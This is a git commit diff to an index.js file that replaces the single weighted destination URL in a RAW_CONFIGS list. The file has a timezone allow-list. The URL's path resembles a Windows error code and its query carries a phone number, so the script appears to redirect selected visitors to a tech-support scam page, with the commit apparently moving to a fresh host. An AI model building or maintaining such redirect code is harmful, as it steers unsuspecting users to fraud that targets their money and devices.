b6a5702e6841a37a65de25173695ce527d2cbd2d
paalakash <palaksh452@gmail.com>
2026-06-11 13:46:13 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://orca-app-x4l2i.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3825", weight: 1.0 }
+    { url: "https://jellyfish-app-vo487.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-3825", weight: 1.0 }
 
 ];
 
